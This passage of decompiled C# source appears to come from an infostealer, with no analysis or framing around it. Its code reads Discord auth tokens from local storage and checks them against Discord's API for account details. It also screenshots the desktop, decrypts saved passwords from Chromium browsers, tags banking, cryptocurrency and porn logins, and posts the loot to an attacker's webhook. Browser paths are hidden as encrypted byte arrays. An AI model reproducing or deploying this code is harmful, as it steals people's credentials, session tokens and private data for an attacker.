						foreach (FileInfo fileInfo in directoryInfo.GetFiles("*.ldb"))
						{
							string input = fileInfo.OpenText().ReadToEnd();
							foreach (object obj in Regex.Matches(input, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
							{
								Match match = (Match)obj;
								list.Add(match.Value);
							}
							foreach (object obj2 in Regex.Matches(input, "mfa\\.[\\w-]{84}"))
							{
								Match match2 = (Match)obj2;
								list.Add(match2.Value);
							}
						}
					}
				}
				return list;
			}

			// Token: 0x06000079 RID: 121 RVA: 0x00005234 File Offset: 0x00003434
			public static async Task GrabTokens()
			{
				foreach (string text in Program.DiscordTokens.tokens)
				{
					Console.WriteLine(text);
					Program.DiscordTokens.Eurynomos eurynomos = new Program.DiscordTokens.Eurynomos(text);
					if (eurynomos.email == "")
					{
						return;
					}
					if (File.Exists(Program.tempFolder + "\\Tokens.txt"))
					{
						File.AppendAllText(Program.tempFolder + "\\Tokens.txt", text + "\n");
					}
					else
					{
						File.WriteAllText(Program.tempFolder + "\\Tokens.txt", text + "\n");
					}
				}
				await Program.DiscordTokens.SendTokens();
			}

			// Token: 0x0600007A RID: 122 RVA: 0x00005274 File Offset: 0x00003474
			public static async Task SendTokens()
			{
				string path = Program.tempFolder + "\\Tokens.txt";
				using (HttpClient httpClient = new HttpClient())
				{
					MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
					byte[] array = File.ReadAllBytes(path);
					multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "Tokens.txt");
					httpClient.PostAsync(Program.WebhookURL, multipartFormDataContent).Wait();
					httpClient.Dispose();
					File.Delete(Program.tempFolder + "\\Tokens.txt");
				}
			}

			// Token: 0x04000095 RID: 149
			public static List<string> target = new List<string>();

			// Token: 0x04000096 RID: 150
			public static List<string> tokens = Program.DiscordTokens.Grab();

			// Token: 0x02000020 RID: 32
			private class Asmodeus
			{
				// Token: 0x04000097 RID: 151
				public static string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

				// Token: 0x04000098 RID: 152
				public static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

				// Token: 0x04000099 RID: 153
				public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");
			}

			// Token: 0x02000021 RID: 33
			private class Satan
			{
				// Token: 0x0600007F RID: 127 RVA: 0x000052B4 File Offset: 0x000034B4
				public static string Extract(string target, string content)
				{
					string text = string.Empty;
					Regex regex = new Regex("\"" + target + "\"\\s*:\\s*(\"(?:\\\\\"|[^\"])*?\")");
					MatchCollection matchCollection = regex.Matches(content);
					foreach (object obj in matchCollection)
					{
						Match match = (Match)obj;
						GroupCollection groups = match.Groups;
						text = groups[1].Value;
					}
					text = text.Replace("\"", "");
					return text;
				}
			}

			// Token: 0x02000022 RID: 34
			private class Eurynomos
			{
				// Token: 0x06000081 RID: 129 RVA: 0x00002877 File Offset: 0x00000A77
				public Eurynomos(string inToken)
				{
					this.token = inToken;
					this.PostToken();
				}

				// Token: 0x06000082 RID: 130 RVA: 0x00005354 File Offset: 0x00003554
				private void PostToken()
				{
					try
					{
						using (HttpClient httpClient = new HttpClient())
						{
							httpClient.DefaultRequestHeaders.Add("Authorization", this.token);
							Task<HttpResponseMessage> async = httpClient.GetAsync("https://discordapp.com/api/v8/users/@me");
							Task<string> task = async.Result.Content.ReadAsStringAsync();
							this.jsonResponse = task.Result;
						}
						this.GetData();
					}
					catch (Exception value)
					{
						Console.Write(value);
					}
				}

				// Token: 0x06000083 RID: 131 RVA: 0x000053E0 File Offset: 0x000035E0
				private void GetData()
				{
					int num;
					if (int.TryParse(this.userId, out num))
					{
						string str = Program.DiscordTokens.Satan.Extract("username", this.jsonResponse);
						this.userId = Program.DiscordTokens.Satan.Extract("id", this.jsonResponse);
						string str2 = Program.DiscordTokens.Satan.Extract("discriminator", this.jsonResponse);
						this.fullUsername = str + "#" + str2;
						string str3 = Program.DiscordTokens.Satan.Extract("avatar", this.jsonResponse);
						this.avatarUrl = "https://cdn.discordapp.com/avatars/" + this.userId + "/" + str3;
						this.phoneNumber = Program.DiscordTokens.Satan.Extract("phone", this.jsonResponse);
						this.email = Program.DiscordTokens.Satan.Extract("email", this.jsonResponse);
						this.locale = Program.DiscordTokens.Satan.Extract("locale", this.jsonResponse);
						long milliseconds = (long)(Convert.ToInt32(num.ToString()) >> 22) + 1420070400000L;
						this.creationDate = DateTimeOffset.FromUnixTimeMilliseconds(milliseconds).DateTime.ToString();
					}
				}

				// Token: 0x0400009A RID: 154
				private string token;

				// Token: 0x0400009B RID: 155
				private string jsonResponse = string.Empty;

				// Token: 0x0400009C RID: 156
				public string fullUsername;

				// Token: 0x0400009D RID: 157
				public string userId;

				// Token: 0x0400009E RID: 158
				public string avatarUrl;

				// Token: 0x0400009F RID: 159
				public string phoneNumber;

				// Token: 0x040000A0 RID: 160
				public string email;

				// Token: 0x040000A1 RID: 161
				public string locale;

				// Token: 0x040000A2 RID: 162
				public string creationDate;
			}
		}

		// Token: 0x02000025 RID: 37
		public class Screenshotting
		{
			// Token: 0x06000088 RID: 136 RVA: 0x00005768 File Offset: 0x00003968
			public static string CaptureScreen()
			{
				try
				{
					Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
					Rectangle bounds = Screen.AllScreens[0].Bounds;
					Graphics graphics = Graphics.FromImage(bitmap);
					graphics.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
					bitmap.Save(Program.tempFolder + "\\Capture.jpg", ImageFormat.Jpeg);
				}
				catch (Exception value)
				{
					Console.Write(value);
				}
				return Program.tempFolder + "\\Capture.jpg";
			}

			// Token: 0x06000089 RID: 137 RVA: 0x0000581C File Offset: 0x00003A1C
			public static async Task SendScreenshot()
			{
				string path = Program.Screenshotting.CaptureScreen();
				using (HttpClient httpClient = new HttpClient())
				{
					MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
					byte[] array = File.ReadAllBytes(path);
					multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "Image.png");
					httpClient.PostAsync(Program.WebhookURL, multipartFormDataContent).Wait();
					httpClient.Dispose();
				}
			}
		}

		// Token: 0x02000027 RID: 39
		public class Passwords
		{
			// Token: 0x0600008D RID: 141 RVA: 0x00005910 File Offset: 0x00003B10
			public static void SendPasswords()
			{
				string webhookURL = Program.WebhookURL;
				string path = Program.tempFolder + "\\passwords.txt";
				using (HttpClient httpClient = new HttpClient())
				{
					MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
					byte[] array = File.ReadAllBytes(path);
					multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "Passwords.txt");
					httpClient.PostAsync(webhookURL, multipartFormDataContent).Wait();
					httpClient.Dispose();
				}
			}

			// Token: 0x0600008E RID: 142 RVA: 0x00005994 File Offset: 0x00003B94
			public static List<Program.Passwords.Password> GetPasswords(string sLoginData)
			{
				List<Program.Passwords.Password> result;
				try
				{
					List<Program.Passwords.Password> list = new List<Program.Passwords.Password>();
					Program.Passwords.SQLite sqlite = Program.Passwords.SqlReader.ReadTable(sLoginData, "logins");
					if (sqlite == null)
					{
						result = list;
					}
					else
					{
						for (int i = 0; i < sqlite.GetRowCount(); i++)
						{
							Program.Passwords.Password item = default(Program.Passwords.Password);
							item.sUrl = Program.Passwords.Crypto.GetUTF8(sqlite.GetValue(i, 0));
							item.sUsername = Program.Passwords.Crypto.GetUTF8(sqlite.GetValue(i, 3));
							string value = sqlite.GetValue(i, 5);
							if (value != null)
							{
								item.sPassword = Program.Passwords.Crypto.GetUTF8(Program.Passwords.Crypto.EasyDecrypt(sLoginData, value));
								list.Add(item);
								Program.Passwords.Banking.ScanData(item.sUrl);
							}
						}
						result = list;
					}
				}
				catch
				{
					result = new List<Program.Passwords.Password>();
				}
				return result;
			}

			// Token: 0x0600008F RID: 143 RVA: 0x000028C1 File Offset: 0x00000AC1
			private static string FormatPassword(Program.Passwords.Password pPassword)
			{
				return string.Format("Url: {0}\nUsername: {1}\nPassword: {2}\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
			}

			// Token: 0x06000090 RID: 144 RVA: 0x00005A58 File Offset: 0x00003C58
			public static void RunPass()
			{
				foreach (string text in Program.Passwords.Paths.sChromiumPswPaths)
				{
					string path;
					if (text.Contains("Opera Software"))
					{
						path = Program.Passwords.Paths.appdata + text;
					}
					else
					{
						path = Program.Passwords.Paths.lappdata + text;
					}
					if (Directory.Exists(path))
					{
						foreach (string str in Directory.GetDirectories(path))
						{
							List<Program.Passwords.Password> passwords = Program.Passwords.GetPasswords(str + "\\Login Data");
							string exploitDir = Program.Passwords.Handler.ExploitDir;
							if (passwords.Count > 0)
							{
								foreach (Program.Passwords.Password pPassword in passwords)
								{
									File.WriteAllText(Program.tempFolder + "\\passwords.txt", Program.Passwords.FormatPassword(pPassword));
								}
							}
						}
					}
				}
				Program.Passwords.SendPasswords();
			}

			// Token: 0x02000028 RID: 40
			internal sealed class Counter
			{
				// Token: 0x06000092 RID: 146 RVA: 0x00002753 File Offset: 0x00000953
				public static string GetSValue(string application, bool value)
				{
					if (!value)
					{
						return "";
					}
					return "\n   ∟ " + application;
				}

				// Token: 0x06000093 RID: 147 RVA: 0x00003F64 File Offset: 0x00002164
				public static string GetIValue(string application, int value)
				{
					if (value == 0)
					{
						return "";
					}
					return string.Concat(new object[]
					{
						"\n   ∟ ",
						application,
						": ",
						value
					});
				}

				// Token: 0x06000094 RID: 148 RVA: 0x00003FA4 File Offset: 0x000021A4
				public static string GetLValue(string application, List<string> value, char separator = '∟')
				{
					value.Sort();
					if (value.Count == 0)
					{
						return "\n   ∟ " + application + " (No data)";
					}
					return string.Concat(new object[]
					{
						"\n   ∟ ",
						application,
						":\n\t\t\t\t\t\t\t",
						separator,
						" ",
						string.Join("\n\t\t\t\t\t\t\t" + separator + " ", value)
					});
				}

				// Token: 0x06000095 RID: 149 RVA: 0x00002769 File Offset: 0x00000969
				public static string GetBValue(bool value, string success, string failed)
				{
					if (!value)
					{
						return "\n   ∟ " + failed;
					}
					return "\n   ∟ " + success;
				}

				// Token: 0x040000AB RID: 171
				public static int Passwords = 0;

				// Token: 0x040000AC RID: 172
				public static int CreditCards = 0;

				// Token: 0x040000AD RID: 173
				public static int AutoFill = 0;

				// Token: 0x040000AE RID: 174
				public static int Cookies = 0;

				// Token: 0x040000AF RID: 175
				public static int History = 0;

				// Token: 0x040000B0 RID: 176
				public static int Bookmarks = 0;

				// Token: 0x040000B1 RID: 177
				public static int Downloads = 0;

				// Token: 0x040000B2 RID: 178
				public static int VPN = 0;

				// Token: 0x040000B3 RID: 179
				public static int Pidgin = 0;

				// Token: 0x040000B4 RID: 180
				public static int Wallets = 0;

				// Token: 0x040000B5 RID: 181
				public static int FTPHosts = 0;

				// Token: 0x040000B6 RID: 182
				public static bool Telegram = false;

				// Token: 0x040000B7 RID: 183
				public static bool Steam = false;

				// Token: 0x040000B8 RID: 184
				public static bool Uplay = false;

				// Token: 0x040000B9 RID: 185
				public static bool Discord = false;

				// Token: 0x040000BA RID: 186
				public static int SavedWifiNetworks = 0;

				// Token: 0x040000BB RID: 187
				public static bool ProductKey = false;

				// Token: 0x040000BC RID: 188
				public static bool DesktopScreenshot = false;

				// Token: 0x040000BD RID: 189
				public static bool WebcamScreenshot = false;

				// Token: 0x040000BE RID: 190
				public static int GrabberDocuments = 0;

				// Token: 0x040000BF RID: 191
				public static int GrabberSourceCodes = 0;

				// Token: 0x040000C0 RID: 192
				public static int GrabberDatabases = 0;

				// Token: 0x040000C1 RID: 193
				public static int GrabberImages = 0;

				// Token: 0x040000C2 RID: 194
				public static bool BankingServices = false;

				// Token: 0x040000C3 RID: 195
				public static bool CryptoServices = false;

				// Token: 0x040000C4 RID: 196
				public static bool PornServices = false;

				// Token: 0x040000C5 RID: 197
				public static List<string> DetectedBankingServices = new List<string>();

				// Token: 0x040000C6 RID: 198
				public static List<string> DetectedCryptoServices = new List<string>();

				// Token: 0x040000C7 RID: 199
				public static List<string> DetectedPornServices = new List<string>();
			}

			// Token: 0x02000029 RID: 41
			internal sealed class Banking
			{
				// Token: 0x06000098 RID: 152 RVA: 0x0000424C File Offset: 0x0000244C
				private static bool AppendValue(string value, List<string> domains)
				{
					string text = value.Replace("www.", "").ToLower();
					if (text.Contains("google") || text.Contains("bing") || text.Contains("yandex") || text.Contains("duckduckgo"))
					{
						return false;
					}
					if (text.StartsWith("."))
					{
						text = text.Substring(1);
					}
					try
					{
						text = new Uri(text).Host;
					}
					catch (UriFormatException)
					{
					}
					text = Path.GetFileNameWithoutExtension(text);
					text = text.Replace(".com", "").Replace(".org", "");
					foreach (string text2 in domains)
					{
						if (text.ToLower().Replace(" ", "").Contains(text2.ToLower().Replace(" ", "")))
						{
							return false;
						}
					}
					text = CultureInfo.CurrentCulture.TextInfo.ToTitleCase(text);
					domains.Add(text);
					return true;
				}

				// Token: 0x06000099 RID: 153 RVA: 0x00005C24 File Offset: 0x00003E24
				private static void DetectCryptocurrencyServices(string value)
				{
					foreach (string value2 in Program.Passwords.Banking.CryptoServices)
					{
						if (value.ToLower().Contains(value2) && value.Length < 25 && Program.Passwords.Banking.AppendValue(value, Program.Passwords.Counter.DetectedCryptoServices))
						{
							Program.Passwords.Counter.CryptoServices = true;
							break;
						}
					}
				}

				// Token: 0x0600009A RID: 154 RVA: 0x00005C78 File Offset: 0x00003E78
				private static void DetectBankingServices(string value)
				{
					foreach (string value2 in Program.Passwords.Banking.BankingServices)
					{
						if (value.ToLower().Contains(value2) && value.Length < 25 && Program.Passwords.Banking.AppendValue(value, Program.Passwords.Counter.DetectedBankingServices))
						{
							Program.Passwords.Counter.BankingServices = true;
							break;
						}
					}
				}

				// Token: 0x0600009B RID: 155 RVA: 0x00005CCC File Offset: 0x00003ECC
				private static void DetectPornServices(string value)
				{
					foreach (string value2 in Program.Passwords.Banking.PornServices)
					{
						if (value.ToLower().Contains(value2) && value.Length < 25 && Program.Passwords.Banking.AppendValue(value, Program.Passwords.Counter.DetectedPornServices))
						{
							Program.Passwords.Counter.PornServices = true;
							break;
						}
					}
				}

				// Token: 0x0600009C RID: 156 RVA: 0x000028E2 File Offset: 0x00000AE2
				public static void ScanData(string value)
				{
					Program.Passwords.Banking.DetectBankingServices(value);
					Program.Passwords.Banking.DetectCryptocurrencyServices(value);
					Program.Passwords.Banking.DetectPornServices(value);
				}

				// Token: 0x0600009D RID: 157 RVA: 0x00005D20 File Offset: 0x00003F20
				public static string DetectCreditCardType(string number)
				{
					foreach (KeyValuePair<string, Regex> keyValuePair in Program.Passwords.Banking.CreditCardTypes)
					{
						if (keyValuePair.Value.Match(number.Replace(" ", "")).Success)
						{
							return keyValuePair.Key;
						}
					}
					return "Unknown";
				}

				// Token: 0x040000C8 RID: 200
				public static string[] CryptoServices = new string[]
				{
					"bitcoin",
					"monero",
					"dashcoin",
					"litecoin",
					"etherium",
					"stellarcoin",
					"btc",
					"eth",
					"xmr",
					"xlm",
					"xrp",
					"ltc",
					"bch",
					"blockchain",
					"paxful",
					"investopedia",
					"buybitcoinworldwide",
					"cryptocurrency",
					"crypto",
					"trade",
					"trading",
					"биткоин",
					"wallet"
				};

				// Token: 0x040000C9 RID: 201
				public static string[] PornServices = new string[]
				{
					"porn",
					"sex",
					"hentai",
					"порно",
					"sex"
				};

				// Token: 0x040000CA RID: 202
				public static string[] BankingServices = new string[]
				{
					"qiwi",
					"money",
					"exchange",
					"bank",
					"credit",
					"card",
					"банк",
					"кредит"
				};

				// Token: 0x040000CB RID: 203
				private static Dictionary<string, Regex> CreditCardTypes = new Dictionary<string, Regex>
				{
					{
						"Amex Card",
						new Regex("^3[47][0-9]{13}$")
					},
					{
						"BCGlobal",
						new Regex("^(6541|6556)[0-9]{12}$")
					},
					{
						"Carte Blanche Card",
						new Regex("^389[0-9]{11}$")
					},
					{
						"Diners Club Card",
						new Regex("^3(?:0[0-5]|[68][0-9])[0-9]{11}$")
					},
					{
						"Discover Card",
						new Regex("6(?:011|5[0-9]{2})[0-9]{12}$")
					},
					{
						"Insta Payment Card",
						new Regex("^63[7-9][0-9]{13}$")
					},
					{
						"JCB Card",
						new Regex("^(?:2131|1800|35\\\\d{3})\\\\d{11}$")
					},
					{
						"KoreanLocalCard",
						new Regex("^9[0-9]{15}$")
					},
					{
						"Laser Card",
						new Regex("^(6304|6706|6709|6771)[0-9]{12,15}$")
					},
					{
						"Maestro Card",
						new Regex("^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$")
					},
					{
						"Mastercard",
						new Regex("5[1-5][0-9]{14}$")
					},
					{
						"Solo Card",
						new Regex("^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$")
					},
					{
						"Switch Card",
						new Regex("^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$")
					},
					{
						"Union Pay Card",
						new Regex("^(62[0-9]{14,17})$")
					},
					{
						"Visa Card",
						new Regex("4[0-9]{12}(?:[0-9]{3})?$")
					},
					{
						"Visa Master Card",
						new Regex("^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$")
					},
					{
						"Express Card",
						new Regex("3[47][0-9]{13}$")
					}
				};
			}

			// Token: 0x0200002A RID: 42
			internal sealed class StringsCrypt
			{
				// Token: 0x060000A0 RID: 160 RVA: 0x00006074 File Offset: 0x00004274
				public static string Decrypt(byte[] bytesToBeDecrypted)
				{
					byte[] bytes = null;
					using (MemoryStream memoryStream = new MemoryStream())
					{
						using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
						{
							rijndaelManaged.KeySize = 256;
							rijndaelManaged.BlockSize = 128;
							Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Program.Passwords.StringsCrypt.cryptKey, Program.Passwords.StringsCrypt.saltBytes, 1000);
							rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
							rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
							rijndaelManaged.Mode = CipherMode.CBC;
							using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
							{
								cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
								cryptoStream.Close();
							}
							bytes = memoryStream.ToArray();
						}
					}
					return Encoding.UTF8.GetString(bytes);
				}

				// Token: 0x060000A1 RID: 161 RVA: 0x000028F6 File Offset: 0x00000AF6
				public static string DecryptConfig(string value)
				{
					if (string.IsNullOrEmpty(value))
					{
						return "";
					}
					if (!value.StartsWith("ENCRYPTED:"))
					{
						return value;
					}
					return Program.Passwords.StringsCrypt.Decrypt(Convert.FromBase64String(value.Replace("ENCRYPTED:", "")));
				}

				// Token: 0x040000CC RID: 204
				private static readonly byte[] saltBytes = new byte[]
				{
					byte.MaxValue,
					64,
					191,
					111,
					23,
					3,
					113,
					119,
					231,
					121,
					252,
					112,
					79,
					32,
					114,
					156
				};

				// Token: 0x040000CD RID: 205
				private static readonly byte[] cryptKey = new byte[]
				{
					104,
					116,
					116,
					112,
					115,
					58,
					47,
					47,
					103,
					105,
					116,
					104,
					117,
					98,
					46,
					99,
					111,
					109,
					47,
					76,
					105,
					109,
					101,
					114,
					66,
					111,
					121,
					47,
					83,
					116,
					111,
					114,
					109,
					75,
					105,
					116,
					116,
					121
				};

				// Token: 0x040000CE RID: 206
				public static string github = Encoding.UTF8.GetString(Program.Passwords.StringsCrypt.cryptKey);

				// Token: 0x040000CF RID: 207
				public static string AnonApiToken = Program.Passwords.StringsCrypt.Decrypt(new byte[]
				{
					169,
					182,
					79,
					179,
					252,
					54,
					138,
					148,
					167,
					99,
					216,
					216,
					199,
					219,
					10,
					249,
					131,
					166,
					170,
					145,
					237,
					248,
					142,
					78,
					196,
					137,
					101,
					62,
					142,
					107,
					245,
					134
				});
			}

			// Token: 0x0200002B RID: 43
			internal sealed class Paths
			{
				// Token: 0x040000D0 RID: 208
				public static string[] sChromiumPswPaths = new string[]
				{
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						191,
						144,
						50,
						4,
						176,
						103,
						41,
						226,
						163,
						145,
						184,
						198,
						37,
						147,
						201,
						246,
						15,
						80,
						188,
						217,
						224,
						55,
						94,
						195,
						60,
						36,
						195,
						150,
						34,
						219,
						225,
						21
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						66,
						190,
						240,
						189,
						196,
						112,
						68,
						209,
						120,
						66,
						32,
						128,
						51,
						187,
						11,
						106,
						133,
						186,
						29,
						203,
						189,
						184,
						20,
						80,
						22,
						110,
						247,
						203,
						200,
						139,
						145,
						252
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						235,
						71,
						60,
						105,
						141,
						89,
						135,
						64,
						7,
						55,
						22,
						242,
						173,
						137,
						97,
						111,
						206,
						79,
						207,
						177,
						151,
						51,
						114,
						222,
						203,
						93,
						6,
						206,
						108,
						141,
						97,
						221
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						73,
						24,
						163,
						202,
						103,
						163,
						250,
						131,
						58,
						254,
						109,
						200,
						0,
						101,
						128,
						192,
						177,
						205,
						31,
						137,
						135,
						207,
						160,
						228,
						106,
						123,
						85,
						109,
						55,
						byte.MaxValue,
						16,
						57
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						94,
						125,
						152,
						164,
						215,
						224,
						18,
						60,
						32,
						98,
						147,
						169,
						150,
						48,
						141,
						211,
						192,
						129,
						56,
						148,
						7,
						104,
						31,
						144,
						122,
						249,
						59,
						25,
						71,
						162,
						241,
						69,
						98,
						84,
						243,
						115,
						233,
						26,
						59,
						183,
						252,
						7,
						8,
						237,
						21,
						222,
						0,
						157
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						139,
						161,
						110,
						219,
						171,
						17,
						246,
						186,
						22,
						213,
						4,
						215,
						141,
						253,
						17,
						173,
						215,
						53,
						171,
						41,
						246,
						99,
						184,
						29,
						177,
						20,
						156,
						97,
						116,
						105,
						188,
						242
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						190,
						77,
						154,
						38,
						44,
						145,
						237,
						67,
						174,
						9,
						133,
						3,
						58,
						246,
						93,
						41,
						23,
						35,
						235,
						203,
						108,
						171,
						65,
						71,
						56,
						233,
						66,
						13,
						202,
						51,
						79,
						41
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						62,
						210,
						240,
						33,
						118,
						184,
						243,
						141,
						77,
						133,
						0,
						235,
						139,
						86,
						39,
						25,
						137,
						185,
						88,
						124,
						221,
						174,
						169,
						88,
						91,
						11,
						213,
						207,
						43,
						146,
						75,
						243
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						62,
						0,
						196,
						29,
						187,
						130,
						95,
						54,
						171,
						116,
						232,
						214,
						233,
						238,
						169,
						220,
						87,
						81,
						58,
						192,
						55,
						32,
						9,
						66,
						192,
						71,
						163,
						194,
						155,
						180,
						1,
						100
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						248,
						132,
						208,
						253,
						161,
						159,
						142,
						173,
						129,
						48,
						103,
						48,
						159,
						71,
						82,
						190,
						211,
						175,
						88,
						121,
						54,
						47,
						62,
						205,
						43,
						35,
						160,
						92,
						160,
						146,
						80,
						219
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						160,
						221,
						244,
						224,
						234,
						124,
						235,
						177,
						76,
						91,
						97,
						50,
						47,
						65,
						63,
						227,
						74,
						50,
						249,
						90,
						53,
						48,
						13,
						166,
						106,
						36,
						144,
						79,
						133,
						138,
						58,
						173
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						14,
						78,
						82,
						180,
						74,
						84,
						229,
						48,
						85,
						125,
						151,
						44,
						44,
						245,
						236,
						69,
						139,
						52,
						31,
						12,
						236,
						152,
						84,
						192,
						7,
						253,
						207,
						160,
						82,
						205,
						206,
						216
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						80,
						37,
						192,
						228,
						231,
						129,
						178,
						111,
						104,
						225,
						219,
						4,
						152,
						121,
						224,
						204,
						47,
						223,
						134,
						64,
						65,
						137,
						96,
						90,
						39,
						174,
						0,
						233,
						231,
						244,
						222,
						81
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						193,
						191,
						13,
						199,
						192,
						122,
						144,
						200,
						83,
						128,
						6,
						28,
						13,
						132,
						90,
						7,
						29,
						217,
						70,
						36,
						4,
						149,
						132,
						62,
						242,
						153,
						217,
						247,
						182,
						13,
						180,
						100
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						191,
						8,
						54,
						18,
						102,
						8,
						237,
						252,
						81,
						68,
						237,
						30,
						28,
						29,
						171,
						167,
						37,
						11,
						209,
						77,
						139,
						81,
						1,
						98,
						185,
						217,
						150,
						213,
						121,
						123,
						68,
						82,
						53,
						254,
						128,
						68,
						133,
						32,
						78,
						35,
						53,
						212,
						98,
						35,
						135,
						101,
						229,
						112,
						43,
						179,
						17,
						51,
						150,
						27,
						145,
						232,
						59,
						202,
						27,
						195,
						245,
						91,
						244,
						53
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						124,
						243,
						34,
						12,
						158,
						74,
						249,
						212,
						5,
						90,
						133,
						132,
						35,
						216,
						217,
						22,
						217,
						55,
						243,
						252,
						51,
						87,
						241,
						238,
						86,
						244,
						62,
						37,
						95,
						154,
						18,
						210,
						62,
						206,
						164,
						16,
						182,
						192,
						15,
						85,
						48,
						23,
						118,
						190,
						110,
						166,
						231,
						219
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						112,
						174,
						206,
						195,
						60,
						254,
						140,
						154,
						222,
						29,
						174,
						131,
						97,
						154,
						190,
						225,
						101,
						102,
						44,
						184,
						116,
						3,
						222,
						149,
						173,
						77,
						23,
						224,
						108,
						61,
						110,
						83
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						168,
						208,
						166,
						82,
						192,
						153,
						44,
						149,
						17,
						233,
						52,
						199,
						126,
						180,
						93,
						48,
						18,
						157,
						146,
						139,
						52,
						61,
						229,
						244,
						233,
						177,
						174,
						202,
						13,
						20,
						68,
						248
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						15,
						171,
						27,
						72,
						143,
						86,
						53,
						189,
						140,
						83,
						1,
						120,
						66,
						90,
						66,
						28,
						128,
						139,
						207,
						118,
						135,
						205,
						39,
						142,
						89,
						231,
						22,
						111,
						194,
						199,
						245,
						22
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						64,
						252,
						183,
						118,
						9,
						181,
						137,
						115,
						42,
						20,
						107,
						204,
						169,
						49,
						101,
						240,
						160,
						210,
						28,
						182,
						65,
						1,
						170,
						136,
						179,
						86,
						242,
						2,
						40,
						236,
						39,
						92
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						163,
						202,
						80,
						117,
						26,
						124,
						142,
						96,
						200,
						150,
						88,
						164,
						24,
						244,
						151,
						69,
						200,
						214,
						2,
						103,
						223,
						49,
						243,
						222,
						70,
						137,
						79,
						85,
						208,
						132,
						160,
						180
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						190,
						180,
						48,
						187,
						130,
						241,
						22,
						142,
						148,
						81,
						86,
						118,
						125,
						198,
						67,
						134,
						168,
						170,
						218,
						153,
						252,
						65,
						45,
						99,
						146,
						136,
						184,
						169,
						8,
						176,
						254,
						158
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						134,
						62,
						128,
						238,
						85,
						244,
						104,
						139,
						79,
						49,
						203,
						166,
						37,
						19,
						150,
						80,
						195,
						12,
						211,
						168,
						230,
						85,
						8,
						141,
						82,
						13,
						200,
						163,
						193,
						61,
						249,
						18
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						189,
						176,
						161,
						91,
						124,
						7,
						222,
						38,
						230,
						226,
						175,
						16,
						213,
						160,
						182,
						221,
						133,
						88,
						75,
						233,
						51,
						39,
						227,
						90,
						53,
						56,
						98,
						251,
						118,
						191,
						198,
						4,
						38,
						3,
						145,
						152,
						83,
						170,
						23,
						225,
						66,
						207,
						208,
						132,
						167,
						27,
						63,
						43
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						13,
						6,
						120,
						217,
						132,
						74,
						167,
						141,
						165,
						239,
						104,
						198,
						115,
						212,
						98,
						108,
						230,
						36,
						207,
						96,
						112,
						142,
						221,
						116,
						224,
						149,
						170,
						246,
						80,
						191,
						143,
						130
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						59,
						208,
						82,
						153,
						38,
						145,
						53,
						186,
						128,
						79,
						177,
						14,
						101,
						235,
						46,
						148,
						230,
						52,
						225,
						181,
						155,
						81,
						183,
						213,
						37,
						54,
						26,
						129,
						9,
						171,
						114,
						201
					}),
					Program.Passwords.StringsCrypt.Decrypt(new byte[]
					{
						210,
						110,
						31,
						64,
						140,
						5,
						137,
						32,
						239,
						70,
						133,
						139,
						182,
						28,
						116,
						149,
						137,
						179,
						177,
						211,
						237,
						32,
						56,
						74,
						238,
